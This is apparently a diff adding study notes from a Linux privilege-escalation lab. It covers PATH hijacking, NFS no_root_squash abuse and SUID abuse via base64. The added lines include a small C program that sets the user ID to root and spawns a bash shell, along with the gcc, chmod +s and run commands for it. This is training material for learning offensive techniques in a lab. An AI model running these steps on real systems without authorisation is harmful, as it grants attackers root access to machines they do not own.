@@ -138,3 +138,26 @@ Intro
 * echo $PATH
 * challenge
     * Login with the creds given.  Find writable directories with find / -writable 2>/dev/null.  Look for an interesting directory to write to.  Export that directory to the $PATH environment variable.  Create a simple bash script that will read the contents of the flag.  Run the test executable
+
+# Task 11 - privilege escalation - nfs
+* cat /etc/exports
+* no_root_squash
+* showmount -e [target_ip]
+```
+int main()
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+* gcc nfs.c -o nfs -w
+* chmod +s nfs
+* ./nfs
+
+# Task 12 - privilege escalation - challenge
+* enumerated the system manually
+* enumerated the system with LinEnum
+* used privilege escalation through SUID and base64
+    * https://gtfobins.github.io/gtfobins/base64/
